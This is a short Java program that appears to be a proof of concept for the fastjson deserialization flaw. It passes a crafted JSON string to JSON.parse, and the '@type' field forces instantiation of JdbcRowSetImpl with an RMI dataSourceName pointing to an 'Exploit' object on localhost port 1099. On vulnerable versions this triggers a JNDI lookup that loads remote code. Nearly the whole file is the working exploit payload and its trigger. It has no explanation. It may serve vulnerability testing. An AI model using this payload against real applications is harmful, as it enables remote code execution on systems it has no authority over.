import com.alibaba.fastjson.*;
import com.alibaba.fastjson.parser.Feature;

public class Main {
    public static void main(String[] argv){
        String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\", \"autoCommit\":true}";
        JSON.parse(payload);
    }
}